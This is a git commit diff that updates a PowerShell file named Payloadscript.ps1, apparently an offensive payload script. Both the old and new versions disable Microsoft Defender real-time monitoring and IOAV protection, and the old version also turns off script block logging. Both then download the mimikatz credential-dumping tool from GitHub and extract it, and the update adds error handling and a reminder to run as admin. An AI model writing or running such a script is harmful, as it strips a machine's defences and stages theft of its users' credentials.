3319960e0020730de7585a2f8fd513e1b8f0deca
GHXST ᕦ(ò_ó)ᕤ <124863515+GHXSTFPS@users.noreply.github.com>
2025-12-09 16:28:49 -0500

    Update Payloadscript.ps1

--- V1/Payloadscript.ps1
+++ V1/Payloadscript.ps1
@@ -1,10 +1,20 @@
+#Turning off AV
+Write-Host "Turning off AV"
+try{
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -EnableScriptBlockLogging $false
-
-$repo = "ParrotSec/mimikatz" #Install mimikatz
-$latest = Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest"
-$asset = $latest.assets | Where-Object { $_.name -like "*.zip" }
-
-Invoke-WebRequest $asset.browser_download_url -OutFile $asset.name
-Expand-Archive $asset.name -DestinationPath ".\package"
+}
+catch{
+        Write-Host "Error turning off AV make sure you are admin $_" 
+}
+#Install Mimikatz
+try{
+Invoke-WebRequest "https://github.com/ParrotSec/mimikatz/archive/refs/heads/master.zip" -OutFile "katz.zip"
+$zipPath = Join-Path $PSScriptRoot "katz.zip"
+$destPath = Join-Path $PSScriptRoot "katz"
+Expand-Archive $zipPath -DestinationPath $destPath
+Remove-Item $zipPath
+}
+catch {
+        Write-Host "Error Downloading mimikatz $_" -ForegroundColor Red
+        }
